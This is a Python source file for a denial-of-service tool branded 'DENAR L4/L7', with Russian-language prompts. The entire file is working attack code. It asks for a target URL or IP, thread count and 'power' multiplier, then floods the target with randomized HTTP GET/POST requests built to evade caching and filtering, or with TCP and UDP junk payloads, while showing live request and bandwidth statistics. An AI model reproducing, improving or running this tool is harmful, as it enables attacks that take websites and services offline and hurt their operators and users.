import socket
import threading
import time
import random
import sys
import ssl
import os
from urllib.parse import urlparse
from colorama import Fore, Style, init

init(autoreset=True)


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
]


HEADERS_TEMPLATES = [
    {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
     "Accept-Language": "en-US,en;q=0.5",
     "Accept-Encoding": "gzip, deflate, br",
     "DNT": "1",
     "Upgrade-Insecure-Requests": "1"},
    
    {"Accept": "*/*",
     "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
     "Cache-Control": "no-cache",
     "Pragma": "no-cache"},
    
    {"Accept": "application/json, text/plain, */*",
     "Content-Type": "application/x-www-form-urlencoded",
     "Origin": "https://example.com",
     "Referer": "https://example.com/",
     "X-Requested-With": "XMLHttpRequest"}
]

class D1vanDev:
    def __init__(self):
        self.running = False
        self.stats_req = 0
        self.stats_bytes = 0
        self.stats_connects = 0
        self.target_url = ""
        self.ip = ""
        self.port = 0
        self.mode = ""
        self.use_ssl = False
        self.sockets = []
        self.keep_alive = True
        self.attack_power = 10  

    def get_target_info(self):
        os.system("cls" if os.name == "nt" else "clear")
        print(Fore.RED + Style.BRIGHT + """

▓█████▄ ▓█████  ███▄    █  ▄▄▄       ██▀███  
▒██▀ ██▌▓█   ▀  ██ ▀█   █ ▒████▄    ▓██ ▒ ██▒
░██   █▌▒███   ▓██  ▀█ ██▒▒██  ▀█▄  ▓██ ░▄█ ▒
░▓█▄   ▌▒▓█  ▄ ▓██▒  ▐▌██▒░██▄▄▄▄██ ▒██▀▀█▄  
░▒████▓ ░▒████▒▒██░   ▓██░ ▓█   ▓██▒░██▓ ▒██▒
 ▒▒▓  ▒ ░░ ▒░ ░░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░
 ░ ▒  ▒  ░ ░  ░░ ░░   ░ ▒░  ▒   ▒▒ ░  ░▒ ░ ▒░
 ░ ░  ░    ░      ░   ░ ░   ░   ▒     ░░   ░ 
   ░       ░  ░         ░       ░  ░   ░     
 ░                                           
        >>> DENAR L4/L7 @D1vanDev <<<
        """)
        
        target = input(f"{Fore.YELLOW}[?] Введите цель (URL или IP): {Fore.WHITE}").strip()
        
        if target.startswith("http"):
            self.mode = "L7"
            parsed = urlparse(target)
            self.ip = parsed.hostname
            self.target_url = parsed.path if parsed.path else "/"
            
            if parsed.scheme == "https":
                self.port = 443
                self.use_ssl = True
            else:
                self.port = 80
                self.use_ssl = False
                
            print(f"{Fore.CYAN}[i] L7 режим: {self.ip}:{self.port} | SSL: {self.use_ssl}")
            
        else:
            self.ip = target
            self.port = int(input(f"{Fore.YELLOW}[?] Введите порт: {Fore.WHITE}"))
            print(f"{Fore.CYAN}--- L4 режимы ---")
            print("1. TCP Flood")
            print("2. UDP Flood")
            print("3. HTTP FLOOD (L7)")
            choice = input(f"{Fore.YELLOW}[?] Режим (1/2/3): {Fore.WHITE}")
            if choice == "3":
                self.mode = "L7"
                self.target_url = "/"
                self.use_ssl = self.port == 443
            else:
                self.mode = "TCP" if choice == "1" else "UDP"

        self.threads = int(input(f"{Fore.YELLOW}[?] Потоки (рекомендуется 300-800): {Fore.WHITE}"))
        self.attack_power = int(input(f"{Fore.YELLOW}[?] Мощность (1-100, умножает запросы): {Fore.WHITE}") or "10")

    def generate_post_data(self):
        
        sizes = [1024, 2048, 4096, 8192]  
        size = random.choice(sizes)
        
        
        data_types = [
            f"username={random.randint(100000,999999)}&password={'A'*(size-50)}",
            f"search={'x'*size}&filter=true&sort=desc",
            f"data={os.urandom(size//2).hex()}&id={random.randint(1,1000)}",
            f"query=SELECT+*+FROM+users+WHERE+id={random.randint(1,1000)}",
            f"json_data={{\"id\":{random.randint(1,1000)},\"value\":\"{'B'*(size-100)}\"}}"
        ]
        return random.choice(data_types)

    def create_http_request(self, use_post=False):
        
        user_agent = random.choice(USER_AGENTS)
        headers_template = random.choice(HEADERS_TEMPLATES)
        
        
        if use_post and random.choice([True, False]):
            method = "POST"
            data = self.generate_post_data()
            content_len = len(data)
            headers = f"Content-Length: {content_len}\r\n"
        else:
            method = "GET"
            data = ""
            headers = ""
        
        
        params = f"?v={random.randint(1,100000)}&cache={random.randint(1000,9999)}"
        if random.choice([True, False]):
            params += f"&ajax={random.randint(1,100)}"
        
        
        for key, value in headers_template.items():
            headers += f"{key}: {value}\r\n"
        
        
        referers = [
            f"https://{self.ip}/",
            "https://www.google.com/",
            "https://www.youtube.com/",
            "https://github.com/",
            ""
        ]
        
        if random.choice([True, False]):
            headers += f"Referer: {random.choice(referers)}\r\n"
        
        
        request = (f"{method} {self.target_url}{params} HTTP/1.1\r\n"
                  f"Host: {self.ip}\r\n"
                  f"User-Agent: {user_agent}\r\n"
                  f"{headers}")
        
        if method == "POST":
            request += f"\r\n{data}"
        else:
            request += "\r\n"
        
        return request.encode()

    def l7_worker_fast(self):
        
        socket_pool = []
        requests_per_connection = random.randint(5, 20)
        
        
        for _ in range(3):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
                if self.use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.ip)
                
                sock.connect((self.ip, self.port))
                socket_pool.append(sock)
                self.stats_connects += 1
            except:
                continue
        
        while self.running and socket_pool:
            for sock in socket_pool[:]:  
                try:
                    
                    for _ in range(requests_per_connection * self.attack_power):
                        request = self.create_http_request(use_post=True)
                        sock.send(request)
                        self.stats_req += 1
                        self.stats_bytes += len(request)
                        
                        
                        if self.stats_req % 100 == 0:
                            time.sleep(0.001)
                    
                    
                    try:
                        sock.recv(1024)
                    except:
                        pass
                        
                except:
                    
                    try:
                        sock.close()
                        socket_pool.remove(sock)
                        
                        
                        new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_sock.settimeout(5)
                        if self.use_ssl:
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            new_sock = context.wrap_socket(new_sock, server_hostname=self.ip)
                        new_sock.connect((self.ip, self.port))
                        socket_pool.append(new_sock)
                        self.stats_connects += 1
                    except:
                        continue
        
        
        for sock in socket_pool:
            try:
                sock.close()
            except:
                pass

    def l7_worker_simple(self):
        
        while self.running:
            try:
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                
                if self.use_ssl:
                    context = ssl._create_unverified_context()
                    sock = context.wrap_socket(sock, server_hostname=self.ip)
                
                sock.connect((self.ip, self.port))
                self.stats_connects += 1
                
                
                for _ in range(self.attack_power * 5):
                    request = self.create_http_request(use_post=random.choice([True, False]))
                    sock.send(request)
                    self.stats_req += 1
                    self.stats_bytes += len(request)
                
                sock.close()
                
            except Exception as e:
                
                continue

    def l4_udp_worker_fast(self):
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        
        payloads = [os.urandom(size) for size in [512, 1024, 1450, 2048]]
        
        while self.running:
            try:
                for _ in range(self.attack_power):
                    payload = random.choice(payloads)
                    sock.sendto(payload, (self.ip, self.port))
                    self.stats_req += 1
                    self.stats_bytes += len(payload)
            except:
                time.sleep(0.001)

    def l4_tcp_worker_fast(self):
        """Быстрая TCP атака"""
        while self.running:
            try:
                
                sockets = []
                for _ in range(min(10, self.attack_power)):
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((self.ip, self.port))
                    sockets.append(s)
                    self.stats_connects += 1
                
                
                for s in sockets:
                    payload = os.urandom(random.randint(128, 1024))
                    s.send(payload)
                    self.stats_req += 1
                    self.stats_bytes += len(payload)
                
                
                for s in sockets:
                    try:
                        s.close()
                    except:
                        pass
                        
            except:
                time.sleep(0.01)

    def monitor(self):
        
        print(f"\n{Fore.GREEN}[+] АТАКА ЗАПУЩЕНА! Ctrl+C для остановки")
        print(f"{Fore.CYAN}[i] Цель: {self.ip}:{self.port}")
        print(f"{Fore.CYAN}[i] Потоки: {self.threads} | Мощность: x{self.attack_power}\n")
        
        last_stats = 0
        last_bytes = 0
        peak_rps = 0
        
        while self.running:
            time.sleep(1)
            
            current_req = self.stats_req
            current_bytes = self.stats_bytes
            current_connects = self.stats_connects
            
            rps = current_req - last_stats
            bps = (current_bytes - last_bytes) * 8  
            
            if rps > peak_rps:
                peak_rps = rps
            
            
            mbps = bps / 1_000_000
            
            # Обновленная строка статистики с количеством соединений
            print(f"\r{Fore.MAGENTA}[LIVE] RPS: {rps:,} | Peak: {peak_rps:,} | Total: {current_req:,} | Connects: {current_connects:,} | Speed: {mbps:.1f} Mbps", 
                  end="", flush=True)
            
            last_stats = current_req
            last_bytes = current_bytes

    def start(self):
        self.get_target_info()
        self.running = True
        
        
        if self.mode == "L7":
            target_func = self.l7_worker_simple  
        elif self.mode == "UDP":
            target_func = self.l4_udp_worker_fast
        else:
            target_func = self.l4_tcp_worker_fast
        
        print(f"\n{Fore.YELLOW}[~] Запускаю {self.threads} потоков...")
        
        
        for i in range(self.threads):
            t = threading.Thread(target=target_func)
            t.daemon = True
            t.start()
            
            
            if i % 50 == 0:
                time.sleep(0.01)
        
        
        monitor_thread = threading.Thread(target=self.monitor)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.running = False
            print(f"\n\n{Fore.RED}[!] Атака остановлена пользователем")
            print(f"{Fore.YELLOW}[+] Итого отправлено: {self.stats_req:,} запросов")
            print(f"{Fore.YELLOW}[+] Всего соединений: {self.stats_connects:,}")
            print(f"{Fore.YELLOW}[+] Общий трафик: {self.stats_bytes / 1_000_000:.2f} MB")

if __name__ == "__main__":
    try:
        tool = D1vanDev()
        tool.start()
    except Exception as e:
        print(f"{Fore.RED}[ERROR] {e}")
        sys.exit(1)
